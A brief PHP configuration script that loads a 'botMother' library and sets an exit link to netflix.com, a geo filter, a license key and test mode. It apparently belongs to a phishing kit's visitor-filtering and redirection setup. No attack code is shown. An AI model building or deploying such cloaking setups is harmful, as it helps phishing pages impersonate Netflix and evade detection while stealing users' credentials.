<?php
require __DIR__ . '/panel.php';
require __DIR__ . '/../../botMother/botMother.php';
$bm = new botMother();
$bm->setExitLink("https://www.netflix.com");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);